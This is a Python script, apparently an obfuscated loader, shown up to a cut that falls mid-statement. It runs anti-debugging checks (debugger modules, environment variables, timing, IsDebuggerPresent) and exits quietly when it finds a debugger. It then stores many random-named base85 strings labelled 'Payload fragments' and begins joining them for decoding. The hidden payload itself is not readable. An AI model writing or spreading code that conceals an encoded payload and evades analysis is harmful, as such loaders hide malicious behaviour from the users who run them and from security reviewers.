#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cbmqKhzOXO8hVX = 'N0{dOx3l@N3z9ZPEY@Xq-WJzngt8fvP68+Jg2qiK`1FX`A@{u|^1o^dz5-(&YM(yTvHHi1?'
_cjM8RFMOox1CVN = 'L7j2TG&aUyk=dx0XrzC(>;!qy;k`MH2hc8xn`*Z*5n5H0W!K(U0xgu0#$PUyzu6rGB#I8-~'
_clAD65p3obJyMU = '?c-%p@7Ez@1#lxkizImgZs?1j}wL@;T!m;mmT*k$`+egY1)*+!bb7^i&oacK;ywxJ!b&dJv'
_cuCMMj1rxAnbkP = '~bn_2hr5${jr_peNm(Eb~SSCvtLi^tw87Du0lS`(Oz1j4vfQC~g|x$L7Ii;eLj*I?VRR^ZA'
_cdh_QBzzwc9lAS = '|x#awlD%NNRWWr*Ja;-z&QC8$U2bL+QSe#m&6xe|dTQ&3PvTd8sN?PD$tfw#q%Y<`N7Ab7R'
_cbspGTsJ082Yeb = '*12p{#=ReFVd)4%Vs)1YzvLQcRiCN4up>T+sGXc~MuAC1sEb2nq&YNg+E?)#hRSt5l>HM5B'
_clmKZe3Az2_oMx = 'R|(R9C-}@V~pi{&Bs2>>03P?eE9k-WX<Qgc05ZEXqw@32l=l$09f%18+^w2%x_}bO4rxLVt'
_cjLmRB5akO8sw1 = '~B}A~=8!Uvm_+^$m-usYXum#?1*}633NF87{)KtAmW2&LEk8$d(8V#^LKgBe_D!%F}(5T#d'
_cbQTmrbGQ6Wg6l = '*|ONL+HvcW{g=5dw{uFp4pum!*laU@~~y8q9Z;MZ>^s>V82E&Q2Ajx1%1Z5~f)03BgP`**{'
_ci9NN5xCYQKWfN = 'uWE;Z*3t@R1?8{eS2vL3B#mhK<lY~^=#cJ|L+28@UnT%-F3q7DA)zh)}wl2qpo0W^sC=Bpm'
_cpk4IU1v7jr30A = 'eLiU&ma}K+={Nxk5J?c2DjJRbkQzpT;?GVlIuf68ckGUR>JP+%%!{)bDQ=f@!q$!PF)4{LE'
_cgK79vx6ZzSHU5 = 'S+iYU<SdDO!GVr`4<;(bthuq?yN?1X~Nup-L#KZ`kUyJX8VNbU$n9`yn|%TKuwZmFSjRvmO'
_cfy2fJWN5lK39f = '2dx2r*PHMZe@{#jCEV9Z{lFkjr{oK-%grfas&lc0K&>*Xn_;$=Yx#u%^4NuHuqVR8}7#0ht'
_cq7fJtaiw3f8GW = 'Z6LKA;k9|p>?yN<^?F8HJ4$ev&wdw6AJB3u3gKI<-*-J+=H>S!$=JsrTDW!z|icJvbf(+>B'
_cjZwvvBMEIVkuI = '72B<Ui^awQ1HDW()N{n3OkuJV~ej->04Z`993WEi!Y~s&rzjX=&tk5>1vqt>k_oS`Yp{qdi'
_cjr6t_yb7bpOHa = 'Mm9<M#5vZ1I4NEZn&^HLPL3Eu>ce>nUDL-LZR2+dZeTBU`{@hU(`<1^0@eD%>E;O@Rb-`%f'
_chRL5ShnBBqpWO = 'mE1e<nv|^GAfLD@4bBa@W!;L(2)~5Bo7E#)Rs|KI6`Ho2qJYL>w|Lz>Yr!m`qC*NMm{R`>r'
_cgE6_eQ0h9Ahg0 = '}v|1JT99qY3CS%K+gj@6ZlTSzCCt-ZappM8;vFtqt?jjToPq$=bv}_}_P35<I<d_Tym?_7-'
_ccAlkp1mobHMID = '0a;8_1|h!7-16(q)wv;68C*SD|+w1EAzI9X#xfgj`kGC;dshuv$#d`a{>4e#4{O(0)iY`)Z'
_cfOWQ_cWmN1WSF = '+@kznZ5wA9j7YloGDjBuUZ3)Az4!^m-3wZ7~;!vVN&F~&UPFto|;$M5**@j6L4XK?~$D!vN'
_cbKgk7jyRUsUZv = '^!>@HUv<W2I1i^*v>>;8H1>q$EWoG|HtkZAQJTi<K{oZFZZ)PFY@m5HPs@6q8daBfk09|tp'
_cxulYt0OaxVBT3 = 'cULO|0|T8(ylKrW%ZA6*?BsG8mzb`{iCh+T-BCoEO{-wjKbhl-!HgAR~dt1YEeOeUrL?c>I'
_cgjMdBUzm_9ukV = 'w82downWU|v!w#Nv~WPKrw)#VDw(>gTKcUa|n3q99waz|5Vqc_Dqo)doXtu&%lGJXatQ7d6'
_cg0h3hjvasX0BS = ';Q>4b8jX+01kFN-rXNV(46HRI_`W0Akw4r><E_lGP?b51<39>Tt$+R}YpRh^O3a0GVNsutH'
_cdii0MNPtNcLJy = ')^4QRMESP}=5=0Yi8RC!|Vg2?o)h*;fihajWbuwW>P*^&|v;^dCIv#Wf0%C1KQ3TJ8+WHFh'
_coql0HaEe8udra = '8Qbvh<v>z$nmi`-3T7n+9;?|3u;Jh4O9C-N^NpeDcn*0<dl`;ycK=|oUZ5~tUo6KJZuk@MP'
_cqI702fBdv1MIE = 'reU*h8Xl4Fdvtj8tv5DwApw71JL{AF#%U7Yoo*kzAF3Joa;(9NQ8~En*OhnjE4~3)YTqg_w'
_cyonLfRAZzM1ff = '^TmphJ%h|5)!_<^m+f6XXjt*{rZ+mR&T-6*NuLdSC^e;a`8{k`J<AS7otE+EDraVW(|X`PC'
_cv9Hps4gfnhFTu = '@vrvXuT!h>++#mR!cgD_nHLTcn$IyUS=`gg*g0dUYE(iWmEFAzCk?P+B-yQ-MvzWqie{l}?'
_cj1i0PixA1WYJC = 's5^(EEE@i?WVdPq$Y5a-vCBW}!N*aIWb#E6qB%h90y-s^QjW9)e;oj4%j+q|xBXS;IKEGn+'
_csgoRx6dKYYH8B = 'Er?%6mWTrG+&`&Qf=p1)S^!<q>67sooSZTViIeO?EX3ku#s88|fEO}(B^H4&<!op;OO}ocB'
_crv7IFUdyeYniy = 'n%A--H(+b>qQr{>w*Zl09knOD^NF1%IRby6EW>NN+TtzJ-#wfM=mD*BU#b<ZnViHC&}_u3h'
_cnKSnSKiFuNO9n = '0Ii7}j2n{M@E%iNf|U&S}MQ7(K+`G8zlHP?a}D*0{FLVSOd-3{`F>?JJtki<x@AMwTY-+yv'
_cen8yj0k5aC628 = 'CttmgvRy$1>CIEIIH{L69nqn7r>upO>$s4?_RbZB!l=Z6)NCrk&HTT|O=l21#$kZ;pv<p~O'
_ctXxBdPlh0LZ0r = '^j9`f_a51N-^;rknY<Eon>(JUIZ;Ea-dhqMcn5(LvHzG`93{J40b6{tqu5NIqm7PP1XjW=i'
_ciIqvN7KtlV1Nc = 't|$*#G%nfobl;Mo@JsCwVh33cxvaVC?uF{^=O@OsDiVcB_M(z3CcU{v@P8_=D5<uP7)jDes'
_cr8zE09SOrVOrU = '>EU9uHb&fg`IWz08U)KIA!y741n!=ho3dy<c0Nx3jAL89}hpqv&0Jq>bv>Y;(}!gS!6#uQ9'
_cjLluvHyXuq4yT = 'li3Xyul}3GL2?NXw#Y+y~ODHC8ir)ekY$L@hR<2k(FiiP-Mn__=+>K7T&Bg-)mWd#Uk8&$m'
_cfSLs2XxM_zPlY = '*QePVm$5)SM3v|G_bbjJL81SlwWvn+ncMAFfyZ(J&xj7ki)hdL$UW}M%?-X5A>;UzwLH<d*'
_c_4DNNJ9oN8YYS = 'rgykopmExQ89fgnz-PpUneR<=3hI*f!sG$*4YeE)ySM?UHe)=4Q%!QqVlN~%uC-KKM6at^<'
_cxiuWHXd7K8SnO = 'CnllVZQbA^Z{fP~uPTA?gHNgUppzP=azsCQCUaR$DBp;>b$|5*3`->})=`t&B9|cOpr`r0M'
_cdwQLNXhoSjUnj = '#EXXkdAz;l)0+WaK6MICTY_DaS%prx@A@srDjVFEf<&PHLN2gdNsVT0SX)YnRCXs2gj<iKd'
_cndlgh4TS642CQ = '$e@7lHss&|P>OItM}ckvgucP~N%9AeMu2O$Y|(%vU{?a*j{~7K{pka%QkA=%!WV8qK7V;?j'
_cmppD2hxKOINJ4 = 'Dqs(JpSVurx1VC1fmHD`w8yS4^EA!V!RHuFOFZ-K3>q+Mhx|M17f<IWfFUNL5V(2hbAKeSs'
_ci0Ni11hc9Nxfo = 'xh<X<m*rvF<CX@hXMTr0ZAj$TM9+0)l*atooj9BJb<&{e198f<or-yP6d)k1z!773C(b{<$'
_ctQTSgVW9F5Bl8 = 'fV&<i^oCiE#6^@qh#jvj3)dL=5?v#;jZ#9m3HMWHT2VaX2-CxJa>kxBo3*tX#4;USLj4`~z'
_cb2cXGRVrzFG_r = '6XHytJ<Gv4a5=vjE%=fc!nr^v3JtRp4v`}Y^Zy~Q_X1=@eqxNgPoyR?77rp-=g5Rk8K4{MS'
_cbk3VVXzQBRL50 = '=wljX+!pOThMhUD-Sa620VTPZ`E~pBZ7OHp$Vb%*!$nV9Z!Xpds8(ypKpTkO5*25Q=Z2*#o'
_csqCl8bsKzabsm = 'B4*^#{c|JjJe2s%i<YLb9}xPP+Cmr&F=TkZuF>yOY}3ek2`GG;MmGh_89TkP0&5FrXOn>rC'
_cmnc2epnoZEXbQ = 'd(Q8<<BcE?*6NA??6MFj_pcUhUMN`MyH)pg0WjQV*PC#ZyUs0y-nvYi2b06s*ei4wSC<*YR'
_ctJWnwzZ4Ph5ZJ = 'ueTIRz>xO64y5>Hu2HuPqS+bIm4<ShO)0CS8}}YM%Jf!?q4SPK?3JQ8|1xtm9}`8T0}uuF-'
_cervxKDgfodq8l = 'TR$J1AnS#J=2s(A0+u&Eh=9@B7K{p;qMl~(t8`qQ&!A(rLv`KSM=7hRML%)F<%;iBLhR}n('
_cvi0SI9c0IqpoX = 'EQ@CG4rKacUAxf#$`)?D*u;vGDCu>iEm_rSLch5qirfT87C(6QtBnqE{BpWcr2rWxX90%l;'
_cdmRs1d6fZDOZ2 = '(FkTX(1p^sndA)5oZie$jJG<XL(SEEr%J%-W^G~U2)^Y88&G)>3^90tqrUyPik!g8AE`=$V'
_csavbLrUm4GK2K = 'QnC>4tYA90q98uQsmi^vF`resZe7iCdvg9~pAQ7wrnVcumhfn-!-zTCF*7nPV)e(<k<-vGZ'
_cayfJfOM0yxjDe = 'J6%0RVD~O61x>+-OsP(rFdu;Bl9h^{iPdLIhOb1ixdH?0>=N1Ejt(nK_Fi}+bdV)9H9!>QB'
_cbnjJ0kiY0UGCW = '{R@TU#NRh=Yjaa{}fU8GW7rLV)m<-lqKAa(EmWDo_)^mL;L8pOX9S1f&Y`DLH~BhUkIUxwb'
_cxXjgiweOoBDbQ = 'S2f;8e8a>IX1EIXUrLNGJTSQ)Z}ukDSw?_nw#fga?W2b=sBW&_!s-E6{3Yy1aXeWG9r%CYC'
_ccB_4LjHrKZ321 = '^P+bFm2Kgl)~6{-6KZfVYd9+%AkPO!`YXQ(O}^KfdA<q%9iupCNqWM?@JGu%%`M}z@%PMr{'
_cszG7tINA2bMM8 = 'kb1@MH!w*-?n>O1pc7P7W;o9wVcVr{g8=2;Gd(v?pC$&WHVICf`?CK((Ca|{fV-qUQG;%e%'
_ctQMjeIj9hQ10k = 'KXnyNZ%>9*h}zdmDMT-{YuF#EY8{hBMq8k`9lgvp5`%Gs7^Qw`xm<m)c!eKW*+cj>a1ND{I'
_cccQ8Zu6SEXLrd = 'v~Bm4!W51Tr7t}`WyHXtmMUO{oMEG_eLIy?U9PLC_5x{VqTNly1Ul6{+9;GY*m&;KT!1B-c'
_c_LrmT_zfIVT66 = 'n&EpSiX2oL{t5V2O@PWC%OT{RCUD&F|Oq-KCWvBB{Z5-z|o23lY%hD882JWee#iQv5k8@6a'
_cyG0yfudwe28YR = '~^_q4Cr9$4=7Hpv`u<hO+jmV`aH6-tYUlN=t9&t4{SDn2zPq8)W^t_?_kp83wD2yne0Vx4c'
_cdQQNe1VvFqSy_ = '-|2f*-kS-D-@ms5eof}NRn7NF9xS44Z(m95!Iga(;cR7^`nCq0s{3}hbb$s|N<$(|`Rdaq7'
_ca2iMeWx_rvZQ9 = '(F+}Oac%1GX@16#qv@pTT}e}lVHN3Wtx(hQ91d}&-h9#B&HM@7@zr{h7=DDzqzfG`{g&mA;'
_cdGjY5O_Exu49l = 'pvc6Xg`+LkztrG)tK>UPQJqkQ0fyAtM`}_!<B^#a{pbRX3=75;8R;z&S3m0U)I=RFndT-0P'
_cjXQ7cihRu57n2 = '*<6d2KAJAx$W#fiD*G4G=EiR3jyOf=6~J@n=`!Ah_@OiVnS~Jws`xTRufa?klJj`S#sAASa'
_crBFTT75Ky9viD = '~1$SQ246d;SaW>(>I(8OA9TmH?#oTjm{cxfxJ{puCxqqy@-J6Ax=x!pSZEh53>as0ADAZ_t'
_cox4LxaNqoU8ff = 'sUKLiR?^dXu_VC%K)fpY^#KDap$hpF`OWa4v%}&g25Lk11fp3d5?)mn~{QnidH?bIdojv5='
_cfV5jqu8hbg4ge = 'Jwx{AJ@A?t>uLM~{}|~IF~OMsjmiLPI^JnX%qU%*-|WW=lAsTO#aS)hg?n`2S84+!j}EsN2'
_cqLXUIbckivIIV = 'vPCf`B^dyeDmTgDT_er-y4sF?LV=5_`ZMM_M<_$GwTa?Lm5L#(+IJJj|@U5og<WBdxM^vMf'
_cxP96mstCM5g8a = 'p;TiCV7R_FzdiTbjT8h>a0&rQaVAY)DuXYL)>B^QCy_T>+bV;dmT`?*6Tf$+*%|;f6iq&kY'
_cpVR0tPBnWLia0 = 'KLW!)6H5)lUp%9OoePKfSBt(Hl^Pp-*PhJ#41YATL}O&1!}Q!HnavquN_NC)5@lC|K&kC|p'
_csa4n4Uq57DpE7 = ')DNYP4Ce!erFYqNBZ%x01>Jifh2MANSDv>La0-`8OgNu!Dk}WNwiwH0a7Waji!NxMul%|^O'
_cknHdZGtWTup9L = 'K+ZzJI4tRqV13k+$o!88>TDC<xzbjw|K%kvXJpaXpQx+iy7`WJ+-*%gOi%>Dn*p_?a%=1fs'
_cxtz6QA8nE012L = '>@E?_G>-&uQf^9LPR4&&<%+ji*PsShQn`}oH>^IUnohKAJs$0j)?NQ|5YID6f2%vwQ0<7JG'
_coqHIeNZsx8ceR = '&*Vi}}q7hqfG0&GRfRl1WDofz{OGnaYAoYTQ;Y1q*!wlZUZKJ>v4z2z(9P*S^QZc8lbew30'
_cishkMIJOVuw0f = '2f#8xz%h_=hI&ZX0=|GbzTMh^a{?74%r<O^J)-}(bxS(gBd4Z8&Z4J4XcnO7vjdK^=>Xw0='
_cmlmcGV_1Ztd7i = '`%X>Mm{2bcR5qA{Y9Ok6iqc2ZTITq090@&3Mu#XMre8w?3&1NuKKqx$kK-)(y4%0mf77xG9'
_cvC1tKseWMxPm_ = 'B!P)$I|~_%9SV?K<rWw{O03r;wBxe>1|#ExV*ZCN5;nbfA7kW93>l>z)SBRpt{*trso=uy#'
_cbJzPWg1FY6zFt = 'E9K!3w+`XZsucra|cwAq`f%GtZN5v&L#M!GYwD?@v$9+9G9J^Bk4FNZ;&jsL1!S%B$!sX5Q'
_cqDpHLfz4MIfMh = 'q4{<7V{Ua3!6^V?f9$-Y*>2wK+OBK=iD=|HkcUb!e%IfUs3MWFtg?0*{3l_v|BVWxov&ejl'
_ctwpIRJ6wEPfNl = 'GHYWE;ITA*52TXh=c#bc__QPgv#)$`hMRL)wzR2`9KDit}X<HL^GHw@1yQb|C^fH&>mIQ9X'
_czZPsxrnDe1MZb = 'zj<}>e8P`GXG;R6F&8pXe?nK%>$ZsHHXnFu-H6W&Hj(EWr`9_=}0;bzo=DO>&L!vZvxA|lC'
_cwg1StzLcslaDE = '#vOFFWg?A^2<?2jWpqcj$39446Wl+%tupMkAu=obX_@|KDgwms(=Brm;^f{z2s=6MAic`LC'
_ccWb__Xp3Q_Ziq = 't0Oxb6HZ6<-y$YfRKG!7~<JZ@~FRvy%A!-qp?bv4LJb%TbzYZbwmUKiq8%j2-S9EF81c{Uv'
_c_T7gLv3HSyVNC = '7Or>-cCBa@|@NMT&sfTTjzq+sjEE1`(TjK{1f6Gqr}q?!D4Tt~TM(_w(-)5S=9<#rLiOe3{'
_chK3DwPM0km9RS = 't-g$_btTmszn8@K$pVnEU{RySbE4&CXskYB+?j9faC)qnFQlmC)GvtSkwbGo<y@<Bt!15_Q'
_cixeloDv680iAL = 'q6uCTEdB1%5p#aWn8-R{u&k(soMN<d*bcXmJ3B=|>-)j{<W-}z~er07xw7hb`L8|P<t#Ilz'
_co_wmWWDZLQ1vA = '38*fQojoia0#+4?PXHJ3I|-nPca!%y6x5_)H2Z3?=3~!c7m%HIe#Tg$A+ab5z4%xjTa<p2g'
_cun9LBwP1dev2O = 'P>`Kcg&GAPu=X7{y3P(`S?bjOEb<x?vFiKu``YLQFZIzQX|cMwNa=?9MK=x^_oZQAR7xE?~'
_ccXqqMgDlGo84X = '|&keo2K(Yfb~%F{#%9QGTqza2n_$)#VS3UQ>;|4HHNl5bP0R1~dv4MOtzFVU3LGJo7J;?*_'
_clh_XrvPsEWqnE = 'o~>>@@-gJd@;&PBg%cJf<ucN0^#WJkU&Q)7t~g34^k!T)^l=`t)|K8F5vn&Zdc*Coz681|6'
_csSAeOgrOkUtVi = 'S|7xkefOQK6*a6S{&~~aD$1?x9mj~2o;<vumS%*O(VZ$k-ru3JbA;d)h5%^?)y8U>X0UPg8'
_cdfgKhP1gZd4fX = 'jGl7Uaw7S2PUffe2Y_ZG+OZSPXBl8!Qhp&hxfCN3p>eOX3ypB}_!zwt)iQD1uDlM-Q7Qf3i'
_cfWtsN0PmoonPn = '}8+)&!+L14=P@q9eYN^{&(kJ(I^qQ$rT%2LJWAh>X^+mNK_O%5#M=q2=~MF3LeB!a+=%+{c'
_cyonbc7nXk5dAm = 'ap6tiAT=gWlQ*`VTy052S$8dA~TjiZ47-1L(3C`uO7!&BDCOgrN9d8P>C9zA{B3+orK0aWz'
_cqW8SqeOHngWkT = 'l0wg95W_&bY~&<QSBEZFf3bP~z{pem)TgH;zb_fOEnaNoD}9j^_P<24bbcnY)6&>S5SFi;+'
_ceh6TzsrvvbU2w = '&T0to2@5_TrePZd^7ii}4XfR`o8Ja!M4Yt1=m>gPP>V3dgBr;JazuU1I2g7HJi8f}P<$`r*'
_ceMobQi5sBmFdm = '{eFCw%Q4%G@*dg!JfBSe_X@zt2?X#uJ|fD<3B&N6RC-nO!+vq7aH4+u(<8A6XsKK%><)80a'
_ckGORG7xrUUozj = 'o_I|qWt~O5g3O;)gYjzMI33pGSfEoOq^N{_T^PoU}2d1FPeNO`o(PP<0$)ctJ<p`K+H<x(s'
_ccIuIwJVjQ630k = 'K|>MY$NEF-v!%Ss#nagq=xKZhfhmWd8dj{)6^RMX-LY2ndi6jr?Qz+{LJ+n(HPuDAU|-WC2'
_cqxmK1qp15sZbr = '%+gXVjf7u+sNJ%5@GLewlKREG5pYVh_;`HSI5DbLOH@5~pm@KIvL>;mYjz{k3QM#sYTij|W'
_cwjYkYSM8nSeJm = '{MJVW6l;m?0dm!}6+U$-ej6yd@(e@WQuwZ>7{$n9sY-Ni;qm3TnAh}P2B>x?gNNB7FllkEy'
_cyykW9h2ORKKOh = '0P(Y0w#!lFB*4sxhu?Nh=t$|!=)A{<Fi3@##iawMx8{qOQ1U%&#~-Pv&XvC))1(eDu`fMu^'
_cwzaLKnp0cONyJ = 'iGx24S`+?xgp{p0wS=N@pbFSTijjj=5;d<CqvnvuurSq)G7pt+D2P`2Wjg?i0Jkcp`Pce$Q'
_cb8T308g1MT8bs = 'Jky+7~hvu)~KBQivG2>QO3^ns*6NjFsvSjBP!Y==(>Fwy`6omDSbQ5YdPWUDoV9JbGlXd>#'
_cbesm3xfvfpLNJ = '7GQ<lw(;wcI_5-m;w&QmDP<<}1*o3a66QmSHM3vpLnCh>T=8s_LO>U2IMU)y|?R^HXOgC=j'
_cq8R6EmAxM9M6Z = 'aj?q_4=E9B;Das_osJ~GCD~U_;?*A@`qu}=&l?3!%WBKJ*Gg1kUCQ~F}DlPm`4MWkIl@gI-'
_crMNiw9kebTQfY = 'm%EbvAL;Jw6K?)rY&9=GWy3zlML-1&Ah0}9NWvV)VjdMOc&RLzE?6V<adIZEF_$vldt~U~B'
_cvXsX7sYSYRgok = 'IXAkf!Gx!u=cjLNTM!+_pAx+Y<vgb_S96fadBpGjuyfjfIZmESh26(Z+;B_`}*ILu^5$0tO'
_clAoEUo0IYyyCg = 'u3jVK1?l0=0eBR~?PlX=A29r)n<2Hwy~;%2{6z(nw=GO;l~bGxhK2I;hM7L-82fwj$V;X1F'
_coaKhveoGTI_hH = 'TeV7k>9v`a@DHw*t|MX(pfDDm|o46t4;&fRS@N$5FN;~Zor(xbM77dN2sW+Q&ig2WJG8V*o'
_cjgmdvaLOk0vEq = 'KEq+C(VuX(0Z5ADench7(yfq!vn{OfU!2ye{>mh)f3bv3EAxq)5R{cUfU{CZ(#hdyNCFZVk'
_coHbmgRSG0ouB3 = '4?{UKK^~)%JsX%#-~0Vtm}s+^v@cd0kdc80y^Rijs1T~{znTZw@iKw1apz`K3uH;Ns{}eV<'
_cw9J78zf1nrgEX = 'EWfM&(4WMgN3<s%cTbb(`kOp3d?%RK~H@e9jy1LNcTa-U98KMK~m17v@UQ26_h4*wr246+5'
_ckBG4aT9ibVNp_ = 'FHj)jSK*=qX%6hQKUCX{P<*Imn%yct(!hEK?ZbH&)i>TC9!=#>uGfFg{lv@0v2;xuT1n?@v'
_cinMCvOTGMc6XK = 'P9L$wS!yGS%?N~M5pTs<3fzNe#+`KOZewW){w&pFH9-?ly<j~z#`#{n!~S<^W$CJMD+9rL~'
_csxZbR8CbuHijh = '$x^CWf2lD_7oZAaYJ6z}Nb$ndRO*?WjVVK}F`7AEROT?sBqlp{y{DvuuDOP#Uq*lpBO<&X)'
_cv4ba9eijZf__Z = 'i>RGh1;mUjj6Zd}Gp10-5)$-EZE#u+rQ*c=#l7*wRmKY?F>a_GP$Te9(%`X^zH=8y#!3r3H'
_ccDhNyAoOMeVrw = '|hYT!vOreGP$%Q9HHhcZ7xm%O*6%Yg_17@@;vr)28du=zCTm_B8HxMey=4&SgMbK8+UC7UU'
_crWXA1aR7r9IT0 = '}niP1{t_tFj929soqWyDlN~6HD(LvBTTQp!WSzFkfKGrnPI?J?k_5Y!m;zE<~Q_MBypmIeK'
_cqEOYyxdhpUBFU = 'rMH3(HYo;Ing&f7vW3J(x4i)DUFzffKMU#b~?o+LjnzpN{ok(ZJE!-_}Lb-MGQ{*9o5*^-%'
_cmQCqjH93XQqix = '*IGb~MBtyhLaRA&po*WgxSHAkV<;BO%zQDh4i})~(X%sGg+DJ<wFd+N=qxp#phxJa=fOUqk'
_cwIpGjJ6KQHoIf = 'N{7IgpWQRlQ7PPm$Yty!Z0NC@`vH@B{6$#06P6f)?2dsyxIq;TFT;xU!+@B_9mHaHDNFmSi'
_cn8sMo76By1hFX = 'qun4Sfb5`0Y5mCHS$G1L^4i%+ru5g8}YmsL*2LW4hp%1e%w21#hCn5EGkdbb&G;J+<K8dc5'
_ci1IhO_BqQ0u53 = 'ZFOx0KDX@yv*mUmfSlM9C=8qh;UW4A1NB%=MArCF~&4gmCxyT_71SiX_Jxor~7dC+Z>d6jD'
_cc6ztODifCHtSn = '_3GH2`HX^bgC2|8#?DkpwfCO~F8VTV20xv+a6omo+Pl~-NDrXFFI@Nip^+{vZix|!pW(48C'
_cmNfTXOn1PSo_e = '77(_mnztpZYdRK97pNl-6DPB6$D0fE--DT(AkF?3fbbGz-OAZX8;}%(xtI9zCrJ!~9IU%V%'
_cdU3ZjI4sREYKw = '{`eUZVo*HS6xC*o9Yf&T;UZXK+3fk998iX#ncB|gCjs+=dINKN*gN)+s}`phZTYV=q+$f<!'
_cltNJcdrQeqkcR = 'pGc8!;JlH=)oR7A$4@5`ChsT?Yp|&nl19YSai^BMcetS&{U4XabtN;gn@A`HAM_~foY_y`;'
_cnINDDYn05oM02 = '^SSn6CR1oXo#AM67KNAQPE!U<GTrk<2LoaN{-Aj9hUuLUbf4oTeNU)Cf|Ch$YYjsU*cW(59'
_cbdT7Nu9zCavOX = '-<U`ZK(T5XU&r;HGJlYBCq4zZOFv`=(T1m|O#4*{YlNDEE#al^464-?LFE#Od$6f}Q40BvS'
_c_ezstLUVNXhLM = '+SaI9B`CbXsw#9S8qQ0ANNC1>AV2I04w(cG#P#PdUJI*9ce|Ewe;yl27$tMuF#L3_*r<>m%'
_cewYs1bv1ig3Gl = '^B{6fL#PZ>%{uWS+#JKL<Q{;5n7!tl*apmlcZn*65Yw38f!Um=?C?&UZZqq4#&HaJS$S{6r'
_cda7B33HF5mIOG = '`kF$;{8qa+$g%hYK?aL9d~63Yw}6LX3!>vwKdj7BGW`-NhM3>!EAS|VBN1w-#Y|&-?@~aQ`'
_clnIj_1Fwmj5qF = '#0H&G@$Ss4q#NjhscjTn-4r5rd9RK3N~2lKcLoJM=M_po&UQcHqO=n;qScho|wN+fD_3Nf@'
_cpzDcXnBN3nI1h = '-THA^#z&LyF4cG#SrxAm%m=Q8a!*jFPdDrc@<{+d?EQ36})PI^e4E1Quw)-9fdynG(wd*a;'
_crskED_qY6ptpB = 'b7`s9#EI)aYhVcmCXptJ?DYv)RmK<0b&FM8m()Cg!L3*HIt3U&g&Y-lR82P_$Niur4i}$gD'
_cojDtIbEK3u_jI = 'Htat**<b_FY9JcNgDdO4(}%0xrRuCPO?M0qlT&<ZuGODbN;j`7c+8)b0&t{*fQAkm;{^H|a'
_czhVNWVm3pGxeC = '|eEwB+s0C>mmv?uGFwLP!I@6g0YV@WgKqKj>mTyK)>ISlM-C--3ZPi3mlTj{#cl<J0ql3jk'
_cst8y2NAWOUfdB = 'O+CA#$?9n%*~kE&Qh5cew7J?MtK~J;j@?BZf;3#%<?d`oY~R`2|_gR>l9Rm7}C9>KIZl^R*'
_ctJ82KcOZVfrE5 = '2(ff>d0(W7&R%xh*nody>{fWmpfh6%L-l1GaYCOMMM7|BAVJ-n1aVJ1WJ&J|V#Zv?dM8!ay'
_coiGvpNYzDm_pX = 'Hzsd7DwS7K*s~&<h@SBP!kdtCP_<Iu;y3!<E(7h^utJ?$)Fd4=G!*mdEMW5}lPY2@8$n_kU'
_corGPH7XuCslWQ = 'yuKur7TeAMIq*u0l(tB3dcmPeARY#Op`HOZ<p'

_ppcXrDXAi9IRwb = __import__('base64').b85decode(_cbmqKhzOXO8hVX + _cjM8RFMOox1CVN + _clAD65p3obJyMU + _cuCMMj1rxAnbkP + _cdh_QBzzwc9lAS + _cbspGTsJ082Yeb + _clmKZe3Az2_oMx + _cjLmRB5akO8sw1 + _cbQTmrbGQ6Wg6l + _ci9NN5xCYQKWfN + _cpk4IU1v7jr30A + _cgK79vx6ZzSHU5 + _cfy2fJWN5lK39f + _cq7fJtaiw3f8GW + _cjZwvvBMEIVkuI + _cjr6t_yb7bpOHa + _chRL5ShnBBqpWO + _cgE6_eQ0h9Ahg0 + _ccAlkp1mobHMID + _cfOWQ_cWmN1WSF + _cbKgk7jyRUsUZv + _cxulYt0OaxVBT3 + _cgjMdBUzm_9ukV + _cg0h3hjvasX0BS + _cdii0MNPtNcLJy + _coql0HaEe8udra + _cqI702fBdv1MIE + _cyonLfRAZzM1ff + _cv9Hps4gfnhFTu + _cj1i0PixA1WYJC + _csgoRx6dKYYH8B + _crv7IFUdyeYniy + _cnKSnSKiFuNO9n + _cen8yj0k5aC628 + _ctXxBdPlh0LZ0r + _ciIqvN7KtlV1Nc + _cr8zE09SOrVOrU + _cjLluvHyXuq4yT + _cfSLs2XxM_zPlY + _c_4DNNJ9oN8YYS + _cxiuWHXd7K8SnO + _cdwQLNXhoSjUnj + _cndlgh4TS642CQ + _cmppD2hxKOINJ4 + _ci0Ni11hc9Nxfo + _ctQTSgVW9F5Bl8 + _cb2cXGRVrzFG_r + _cbk3VVXzQBRL50 + _csqCl8bsKzabsm + _cmnc2epnoZEXbQ + _ctJWnwzZ4Ph5ZJ + _cervxKDgfodq8l + _cvi0SI9c0IqpoX + _cdmRs1d6fZDOZ2 + _csavbLrUm4GK2K + _cayfJfOM0yxjDe + _cbnjJ0kiY0UGCW + _cxXjgiweOoBDbQ + _ccB_4LjHrKZ321 + _cszG7tINA2bMM8 + _ctQMjeIj9hQ10k + _cccQ8Zu6SEXLrd + _c_LrmT_zfIVT66 + _cyG0yfudwe28YR + _cdQQNe1VvFqSy_ + _ca2iMeWx_rvZQ9 + _cdGjY5O_Exu49l + _cjXQ7cihRu57n2 + _crBFTT75Ky9viD + _cox4LxaNqoU8ff + _cfV5jqu8hbg4ge + _cqLXUIbckivIIV + _cxP96mstCM5g8a + _cpVR0tPBnWLia0 + _csa4n4Uq57DpE7 + _cknHdZGtWTup9L + _cxtz6QA8nE012L + _coqHIeNZsx8ceR + _cishkMIJOVuw0f + _cmlmcGV_1Ztd7i + _cvC1tKseWMxPm_ + _cbJzPWg1FY6zFt + _cqDpHLfz4MIfMh + _ctwpIRJ6wEPfNl + 